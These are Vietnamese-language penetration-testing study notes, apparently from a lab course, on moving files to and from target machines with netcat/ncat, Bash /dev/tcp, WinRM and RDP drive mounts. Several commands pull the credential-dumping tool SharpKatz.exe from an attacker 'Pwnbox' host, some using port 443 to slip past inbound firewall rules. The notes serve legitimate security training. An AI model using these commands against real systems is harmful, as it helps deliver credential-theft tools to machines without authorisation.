# Miscellaneous File Transfer Methods

## Mục tiêu

Ngoài các cách transfer phổ biến như HTTP, SMB, FTP, PowerShell, wget/curl, ta còn có thể dùng:

- Netcat / Ncat
- Bash `/dev/tcp`
- PowerShell Remoting / WinRM
- RDP copy-paste hoặc mount local drive

Mục tiêu là linh hoạt transfer file khi môi trường bị hạn chế.

## Netcat / Ncat

Netcat (`nc`) có thể đọc/ghi dữ liệu qua TCP/UDP nên có thể dùng để transfer file.

Có 2 hướng chính:

1. Target mở listener, Pwnbox gửi file vào.
2. Pwnbox mở listener, target connect ra để nhận file.

Cách 2 hữu ích khi firewall chặn inbound vào target nhưng cho phép outbound từ target ra ngoài.

## Method 1: Target listen, Pwnbox send

Target nhận file bằng original Netcat:

```bash
nc -l -p 8000 > SharpKatz.exe
```

Target nhận file bằng Ncat:

```
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Pwnbox gửi file bằng original Netcat:

```
nc -q 0 TARGET_IP 8000 < SharpKatz.exe
```

Pwnbox gửi file bằng Ncat:

```
ncat --send-only TARGET_IP 8000 < SharpKatz.exe
```

## Method 2: Pwnbox listen, Target receive

Pwnbox gửi file qua listener bằng original Netcat:

```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Target connect ra và nhận file:

```
nc PWNBOX_IP 443 > SharpKatz.exe
```

Pwnbox gửi file bằng Ncat:

```
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Target nhận bằng Ncat:

```
ncat PWNBOX_IP 443 --recv-only > SharpKatz.exe
```

## Nếu target không có nc/ncat

Dùng Bash `/dev/tcp` để nhận file:

Pwnbox:

```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Target:

```
cat < /dev/tcp/PWNBOX_IP/443 > SharpKatz.exe
```

## PowerShell Remoting / WinRM

PowerShell Remoting dùng WinRM.

Port mặc định:

- HTTP: TCP/5985
- HTTPS: TCP/5986

Kiểm tra port WinRM:

```
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Tạo session:

```
$Session = New-PSSession -ComputerName DATABASE01
```

Copy file từ local sang remote session:

```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

Copy file từ remote session về local:

```
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP File Transfer

RDP có thể transfer file bằng:

- Copy/paste
- Mount local folder/drive vào remote session

Mount Linux folder bằng rdesktop:

```
rdesktop TARGET_IP -d DOMAIN -u USER -p 'PASSWORD' -r disk:linux='/home/user/rdesktop/files'
```

Mount Linux folder bằng xfreerdp:

```
xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' /drive:linux,/home/user/filetransfer
```

Trong Windows RDP session, truy cập:

```
\\tsclient\
```

Ví dụ:

```
\\tsclient\linux
```

## Ghi nhớ

- Nếu inbound vào target bị chặn, để Pwnbox listen và target connect ra.
- Nếu target có nc/ncat, dùng Netcat transfer.
- Nếu target không có nc/ncat nhưng có Bash, thử `/dev/tcp`.
- Nếu có WinRM và quyền phù hợp, dùng PowerShell Remoting + Copy-Item.
- Nếu có RDP, dùng copy-paste hoặc mount local drive.
- Luôn check file sau transfer bằng `ls`, `file`, `Get-FileHash`, `md5sum`.